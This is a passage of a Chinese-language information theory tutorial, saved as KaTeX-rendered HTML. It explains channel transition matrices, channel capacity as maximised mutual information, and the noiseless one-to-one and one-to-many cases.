mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>，那么信息从 X 传递到 Y 的转移概率矩阵，也叫做信道矩阵如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>1</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>2</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>m</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>1</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>2</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>m</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>⋯</mo><mo>⋯</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>1</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mn>2</mn></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>m</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[\begin{array}{c}p\left(b_1 / a_1\right), p\left(b_2 / a_1\right), \cdots, p\left(b_m / a_1\right) \\p\left(b_1 / a_2\right), p\left(b_2 / a_2\right), \cdots, p\left(b_m / a_2\right) \\\cdots \cdots \\p\left(b_1 / a_n\right), p\left(b_2 / a_n\right), \cdots, p\left(b_m / a_n\right)\end{array}\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.8em;vertical-align:-2.15em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.667em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="4.800em" viewBox="0 0 667 4800"><path d="M403 1759 V84 H666 V0 H319 V1759 v1200 v1759 h347 v-84H403z M403 1759 V0 H319 V1759 v1200 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">⋯⋯</span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.667em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="4.800em" viewBox="0 0 667 4800"><path d="M347 1759 V0 H0 V84 H263 V1759 v1200 v1759 H0 v84 H347zM347 1759 V0 H263 V1759 v1200 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>信道容量通过调整 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(a_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的概率分布，实现 X 和 Y 最大的互信息量，也就是最大的可以承载的能力。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>C</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></munder><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></munder><mo stretchy="false">[</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></munder><mo stretchy="false">[</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}C &amp; =\max _{p\left(a_i\right)} I(X ; Y) \\&amp; =\max _{p\left(a_i\right)}[H(X)-H(X / Y)]=\max _{p\left(a_i\right)}[H(Y)-H(Y / X)]\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.212em;vertical-align:-1.856em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.356em;"><span style="top:-4.516em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.856em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.356em;"><span style="top:-4.516em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.309em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.309em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.309em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.856em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>一般的信道容量是比较复杂的，只需要掌握特殊的即可。很多时候入门信息论，都是定性分析。<strong>优化的变量，都是 X 的符号的概率，而不是 Y 的概率。</strong></p><p><strong>无噪声 X 和 Y 一对一：</strong></p><p>那么转移概率矩阵就是每行一个 1，而且每列一个 1，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">H(X|Y)=H(Y|X)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>C</mi><mo>=</mo><mi>max</mi><mo>⁡</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>log</mi><mo>⁡</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">C=\max H(X)=\log n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">max</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><p><strong>无噪声 X 和 Y 一对多：</strong></p><p>信道矩阵就是每行若干个概率，但是每一列只有一个不为 0</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo 